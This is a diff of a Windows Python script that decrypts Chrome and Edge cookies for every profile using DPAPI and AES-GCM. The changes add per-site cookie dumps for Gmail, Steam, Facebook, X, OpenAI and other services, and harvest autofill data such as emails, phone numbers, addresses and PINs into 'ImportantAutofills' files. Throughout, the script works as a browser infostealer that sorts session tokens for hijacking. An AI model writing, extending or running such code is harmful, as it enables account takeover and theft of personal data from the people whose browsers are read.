@@ -5,10 +5,37 @@ import shutil
 import sqlite3
 import tempfile
 from pathlib import Path
-from typing import Iterable, Tuple, Callable
+from typing import Iterable, Tuple, Callable, List, Dict, Set
 from collections import defaultdict
+import re
 
-# Third-party deps expected:
+# ----------------------------
+# Config: site filters
+# ----------------------------
+# Key = short label in filename, Value = tuple of domains (right-most match)
+SITE_FILTERS = {
+    "gmail": ("gmail.com", "google.com", "accounts.google.com"),
+    "steam": ("steampowered.com", "steamcommunity.com", "steam.com"),
+    "youtube": ("youtube.com", "ytimg.com", "googlevideo.com"),
+    "facebook": ("facebook.com", "fb.com", "messenger.com"),
+    "instagram": ("instagram.com",),
+    "tiktok": ("tiktok.com",),
+    "x": ("x.com", "twitter.com", "t.co"),
+    "openai": ("openai.com",),
+    # add more as you need...
+}
+
+# Important autofill name patterns (case-insensitive) we keep
+AUTOFILL_NAME_PATTERNS = [
+    r"email", r"e-mail", r"mail",
+    r"phone", r"tel", r"mobile",
+    r"first[_-]?name", r"last[_-]?name", r"full[_-]?name", r"name\[first\]", r"name\[last\]",
+    r"address", r"street", r"city", r"state", r"region", r"province",
+    r"postal", r"zipcode", r"zip", r"postcode",
+    r"billing", r"shipping",
+    r"pin", r"reg[_-]?email", r"emailField", r"change_email",
+]
+
 #   pip install -U browser-cookie3 pywin32 pycryptodome
 try:
     from Crypto.Cipher import AES  # pycryptodome
@@ -54,7 +81,6 @@ def iter_cookies_from(callable_fetch: Callable[[], Iterable],
         except Exception as e:
             print(f"[{label}] Skipped: {e!s}")
     else:
-        # Do not swallow exceptions -> allow fallback logic to trigger
         yield from _iter()
 
 
@@ -69,12 +95,9 @@ def chromium_profile_paths(vendor: str):
     if not base.exists():
         return
 
-    # Default first, then Profile *
     candidates = [base / "Default"] + sorted(p for p in base.glob("Profile *") if p.is_dir())
     for prof in candidates:
-        # Newer location
         cookies_new = prof / "Network" / "Cookies"
-        # Legacy location
         cookies_old = prof / "Cookies"
         if cookies_new.exists():
             yield cookies_new, key_file, prof.name
@@ -91,12 +114,7 @@ def with_temp_copy(src: Path) -> Path:
         return dst
     except Exception as e:
         print(f"[Copy] Could not copy DB '{src}': {e!s}. Will try direct read.")
-        return src  # fall back: let browser_cookie3 or sqlite try its own logic
-
-
-# ----------------------------
-# Manual Chromium decryption
-# ----------------------------
+        return src
 
 def _require_crypto_deps():
     if AES is None:
@@ -111,8 +129,8 @@ def load_chromium_key(key_file: Path) -> bytes:
     try:
         with open(key_file, "r", encoding="utf-8") as f:
             js = json.load(f)
-        ek_b64 = js["os_crypt"]["encrypted_key"]  # base64 string
-        ek = base64.b64decode(ek_b64)[5:]         # strip 'DPAPI' prefix
+        ek_b64 = js["os_crypt"]["encrypted_key"]
+        ek = base64.b64decode(ek_b64)[5:]  # strip 'DPAPI'
         key = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
         if not key:
             raise RuntimeError("DPAPI returned empty key")
@@ -133,13 +151,11 @@ def decrypt_chromium_value(enc: bytes, key: bytes) -> str:
         return ""
     try:
         hdr = enc[:3]
-        # match b'v' + 2 digits (e.g., v10, v11, v20)
         if len(hdr) == 3 and hdr[0:1] == b"v" and all(48 <= b <= 57 for b in hdr[1:3]):
             nonce = enc[3:15]
             ct = enc[15:]
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ct[:-16], ct[-16:]).decode("utf-8", "ignore")
-        # Legacy DPAPI blob
         dec = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
         return dec.decode("utf-8", "ignore")
     except Exception:
@@ -153,7 +169,6 @@ def chrome_expires_utc_to_unix(expires_utc: int) -> int:
     """
     if not expires_utc or expires_utc <= 0:
         return 0
-    # 11644473600000000 = difference between Windows epoch (1601) and Unix epoch (1970) in microseconds
     return (expires_utc - 11644473600000000) // 1000000
 
 
@@ -167,12 +182,6 @@ def _b2s(x):
 def iter_chromium_cookies_direct(cookie_db: Path, key_file: Path, label: str) -> Iterable[Tuple]:
     """
     Yield Netscape tuples reading the SQLite DB directly (fallback without browser_cookie3).
-    Requires:
-      - load_chromium_key
-      - with_temp_copy
-      - chrome_expires_utc_to_unix
-      - decrypt_chromium_value
-      - convert_to_netscape_time
     """
     key = load_chromium_key(key_file)
     if not key:
@@ -195,15 +204,11 @@ def iter_chromium_cookies_direct(cookie_db: Path, key_file: Path, label: str) ->
                 FROM cookies
             """)
             for r in cur:
-                # Convert Chromium expires_utc (µs since 1601-01-01) -> Unix seconds
                 ts = chrome_expires_utc_to_unix(int(r["expires_utc"] or 0))
-
-                # Prefer plaintext "value"; if empty, decrypt "encrypted_value"
                 val = r["value"] or ""
                 if not val:
                     encv = r["encrypted_value"]
                     if encv is not None:
-                        # ensure bytes
                         if isinstance(encv, memoryview):
                             encv = encv.tobytes()
                         elif isinstance(encv, str):
@@ -222,10 +227,89 @@ def iter_chromium_cookies_direct(cookie_db: Path, key_file: Path, label: str) ->
     except Exception as e:
         print(f"[{label}] Fallback read failed: {e!s}")
 
+def profile_dir_from_cookie_db(cookie_db: Path) -> Path:
+    """
+    Infer profile directory from cookie DB path.
+    - .../Profile X/Network/Cookies  -> Profile X
+    - .../Profile X/Cookies          -> Profile X
+    - .../Default/...                -> Default
+    """
+    parts = list(cookie_db.parts)
+    # If path ends with .../<Profile>/Network/Cookies
+    if len(parts) >= 3 and parts[-2] == "Network" and parts[-1] == "Cookies":
+        return Path(*parts[:-2])  # drop 'Network/Cookies'
+    # If path ends with .../<Profile>/Cookies
+    if len(parts) >= 2 and parts[-1] == "Cookies":
+        return Path(*parts[:-1])  # drop 'Cookies'
+    return cookie_db.parent
 
-# ----------------------------
-# Filename helpers
-# ----------------------------
+
+def read_autofill_pairs_from_profile(profile_dir: Path) -> List[Tuple[str, str]]:
+    """
+    Read (name, value) pairs from Chromium 'Web Data' DB in the given profile.
+    Uses table 'autofill' (form field name/value history).
+    """
+    web_data = profile_dir / "Web Data"
+    if not web_data.exists():
+        return []
+
+    src = with_temp_copy(web_data)
+    pairs: List[Tuple[str, str]] = []
+    try:
+        with sqlite3.connect(str(src)) as conn:
+            conn.row_factory = sqlite3.Row
+            try:
+                cur = conn.execute("""
+                    SELECT name, value
+                    FROM autofill
+                    WHERE name IS NOT NULL AND value IS NOT NULL
+                    ORDER BY date_last_used DESC
+                """)
+            except sqlite3.OperationalError:
+                cur = conn.execute("""
+                    SELECT name, value
+                    FROM autofill
+                    WHERE name IS NOT NULL AND value IS NOT NULL
+                """)
+
+            for r in cur:
+                n = (r["name"] or "").strip()
+                v = (r["value"] or "").strip()
+                if n and v:
+                    pairs.append((n, v))
+    except Exception as e:
+        print(f"[Autofill] Failed reading Web Data at '{web_data}': {e!s}")
+    return pairs
+
+
+def filter_important_autofills(pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
+    """
+    Keep only pairs whose name matches important patterns and values look reasonable.
+    Deduplicate by (name, value) order-preserving.
+    """
+    if not pairs:
+        return []
+
+    rx = re.compile("|".join(AUTOFILL_NAME_PATTERNS), re.IGNORECASE)
+    seen: Set[Tuple[str, str]] = set()
+    out: List[Tuple[str, str]] = []
+    for n, v in pairs:
+        if len(v) > 200:
+            continue
+        if not rx.search(n):
+            continue
+        key = (n, v)
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append((n, v))
+    return out
+
+def write_kv_file(path: Path, items: List[Tuple[str, str]]):
+    """Write 'key: value' per line."""
+    with open(path, "w", encoding="utf-8") as f:
+        for k, v in items:
+            f.write(f"{k}: {v}\n")
 
 def make_chromium_label(vendor: str, prof_name: str, cookie_db: Path) -> str:
     """Return label like 'Google_[Chrome]_Default Network' or 'Microsoft_[Edge]_Profile 1 Network'."""
@@ -234,9 +318,7 @@ def make_chromium_label(vendor: str, prof_name: str, cookie_db: Path) -> str:
     elif vendor.startswith("Microsoft/Edge"):
         prefix = "Microsoft_[Edge]"
     else:
-        prefix = vendor  # fallback, shouldn't happen here
-
-    # Detect whether DB came from Network/Cookies or legacy Cookies
+        prefix = vendor
     loc = "Network" if any(p.name == "Network" for p in cookie_db.parents) else "Cookies"
     return f"{prefix}_{prof_name} {loc}"
 
@@ -250,24 +332,43 @@ def write_netscape_file(path: Path, items):
             f.write(f"{row[0]}\t{row[1]}\t{row[2]}\t{row[3]}\t{row[4]}\t{row[5]}\t{row[6]}\n")
 
 
-# ----------------------------
-# Main aggregator
-# ----------------------------
+def domain_matches_any(host: str, domains: Tuple[str, ...]) -> bool:
+    """Check if host matches any of right-most domains."""
+    if not host:
+        return False
+    h = host.lstrip(".").lower()
+    for d in domains:
+        d = d.lstrip(".").lower()
+        if h == d or h.endswith("." + d) or h.endswith(d):
+            return True
+    return False
 
-def get_browser_cookies(output_file="cookies.txt"):
-    """Collect cookies from Chrome, Edge, and Firefox, write in Netscape format."""
-    # Late import to allow running even if not installed (only Firefox will work without deps)
+
+def filter_items_by_domains(items: List[Tuple], domains: Tuple[str, ...]) -> List[Tuple]:
+    """Return only items whose domain matches any in domains."""
+    out = []
+    for row in items:
+        domain = (row[0] or "")
+        if domain_matches_any(domain, domains):
+            out.append(row)
+    return out
+
+def get_browser_cookies(output_dir="Cookies"):
+    """Collect cookies from Chrome and Edge, write per-profile files, per-site files, and ImportantAutofills."""
+    # Late import: Firefox via browser_cookie3 is optional here (we're focusing on Chromium)
     try:
         import browser_cookie3 as bc3  # type: ignore
         bc3_version = getattr(__import__('browser_cookie3'), '__version__', 'unknown')
         print(f"[Info] browser_cookie3 version: {bc3_version}")
     except ImportError:
         bc3 = None
-        print("[Warn] browser_cookie3 is not installed. Install with: pip install browser-cookie3")
+        print("[Warn] browser_cookie3 is not installed. Firefox will be skipped.")
 
-    cookies_data = []
-    # Per-profile collectors for Chromium-based browsers
-    per_profile = defaultdict(list)  # key: label from make_chromium_label(...), value: list of tuples
+    outdir = Path(output_dir)
+    outdir.mkdir(parents=True, exist_ok=True)
+
+    per_profile = defaultdict(list)  # key: label -> list of netscape tuples
+    profile_dirs: Dict[str, Path] = {}
 
     # --- Chrome (enumerate all profiles) ---
     any_chrome = False
@@ -276,12 +377,12 @@ def get_browser_cookies(output_file="cookies.txt"):
         copy_path = with_temp_copy(cookie_db)
         print(f"[Chrome] Using profile '{prof_name}': {cookie_db}")
         label_fs = make_chromium_label("Google/Chrome", prof_name, cookie_db)
+        profile_dirs[label_fs] = profile_dir_from_cookie_db(cookie_db)
 
         used_bc3 = False
         batch = []
         if bc3 is not None:
             try:
-                # Do NOT suppress exceptions here; we want fallback to trigger if bc3 fails
                 batch = list(
                     iter_cookies_from(
                         lambda p=copy_path, k=key_file: bc3.chrome(cookie_file=str(p), key_file=str(k)),
@@ -296,21 +397,11 @@ def get_browser_cookies(output_file="cookies.txt"):
         if not used_bc3:
             batch = list(iter_chromium_cookies_direct(cookie_db, key_file, f"Chrome:{prof_name}"))
 
-        # accumulate
         if batch:
-            cookies_data.extend(batch)
             per_profile[label_fs].extend(batch)
 
     if not any_chrome:
-        print("[Chrome] No explicit profile paths found. Trying auto discovery.")
-        if bc3 is not None:
-            try:
-                batch = list(iter_cookies_from(lambda: bc3.chrome(), "Chrome(auto)", suppress=False))
-                if batch:
-                    cookies_data.extend(batch)
-                    # auto-discovery may mix profiles; write only to combined file
-            except Exception as e:
-                print(f"[Chrome(auto)] bc3 failed: {e!s}")
+        print("[Chrome] No explicit profile paths found.")
 
     # --- Edge (enumerate all profiles) ---
     any_edge = False
@@ -319,6 +410,7 @@ def get_browser_cookies(output_file="cookies.txt"):
         copy_path = with_temp_copy(cookie_db)
         print(f"[Edge] Using profile '{prof_name}': {cookie_db}")
         label_fs = make_chromium_label("Microsoft/Edge", prof_name, cookie_db)
+        profile_dirs[label_fs] = profile_dir_from_cookie_db(cookie_db)
 
         used_bc3 = False
         batch = []
@@ -338,49 +430,49 @@ def get_browser_cookies(output_file="cookies.txt"):
         if not used_bc3:
             batch = list(iter_chromium_cookies_direct(cookie_db, key_file, f"Edge:{prof_name}"))
 
-        # accumulate
         if batch:
-            cookies_data.extend(batch)
             per_profile[label_fs].extend(batch)
 
     if not any_edge:
-        print("[Edge] No explicit profile paths found. Trying auto discovery.")
-        if bc3 is not None:
-            try:
-                batch = list(iter_cookies_from(lambda: bc3.edge(), "Edge(auto)", suppress=False))
-                if batch:
-                    cookies_data.extend(batch)
-                    # auto-discovery may mix profiles; write only to combined file
-            except Exception as e:
-                print(f"[Edge(auto)] bc3 failed: {e!s}")
+        print("[Edge] No explicit profile paths found.")
 
-    # --- Firefox (auto) ---
-    if bc3 is not None:
-        # For Firefox we can keep suppress=True; failures here are non-critical
-        cookies_data.extend(iter_cookies_from(lambda: bc3.firefox(), "Firefox", suppress=True))
-    else:
-        print("[Firefox] Skipped because browser_cookie3 is not installed.")
-
-    # Write combined file
-    combined = Path(output_file)
-    write_netscape_file(combined, cookies_data)
-    print(f"[Done] Saved {len(cookies_data)} cookies to {combined}")
-
-    # Write per-profile files (Chromium-only)
-    out_dir = combined.parent if combined.parent.as_posix() != "." else Path.cwd()
+    total_files = 0
+    total_rows = 0
     for label, items in per_profile.items():
-        # exact label as filename + .txt, as requested
-        file_path = out_dir / f"{label}.txt"
-        write_netscape_file(file_path, items)
-        print(f"[Done] Saved {len(items)} cookies to '{file_path.name}'")
+        profile_path = outdir / f"{label}.txt"
+        write_netscape_file(profile_path, items)
+        print(f"[Write] {label}.txt  ({len(items)} rows)")
+        total_files += 1
+        total_rows += len(items)
+
+        for site_label, domain_tuple in SITE_FILTERS.items():
+            sub = filter_items_by_domains(items, domain_tuple)
+            if not sub:
+                continue
+            site_path = outdir / f"{label}__{site_label}.txt"
+            write_netscape_file(site_path, sub)
+            print(f"[Write] {label}__{site_label}.txt  ({len(sub)} rows)")
+            total_files += 1
+
+        prof_dir = profile_dirs.get(label)
+        if prof_dir:
+            pairs = read_autofill_pairs_from_profile(prof_dir)
+            important = filter_important_autofills(pairs)
+            if important:
+                autof_path = outdir / f"{label}__ImportantAutofills.txt"
+                write_kv_file(autof_path, important)
+                print(f"[Write] {label}__ImportantAutofills.txt  ({len(important)} lines)")
+                total_files += 1
+
+    print(f"[Done] Wrote {total_files} files into '{outdir.resolve()}', total cookie rows: {total_rows}")
 
 
 if __name__ == "__main__":
     if os.name == "nt":
         print("Info: Run as the same Windows user who used the browsers.")
-        print("Info: Close Chrome/Edge/Firefox and disable background apps (chrome://settings/system).")
+        print("Info: Close Chrome/Edge and disable background apps (chrome://settings/system).")
         print("Info: Avoid running from services/SYSTEM; prefer normal user session.")
     else:
-        print("Warn: This script is tailored for Windows DPAPI decryption.")
+        print("Warn: This script is tailored for Windows DPAPI decryption (Windows only).")
 
-    get_browser_cookies()
+    get_browser_cookies(output_dir="Cookies")
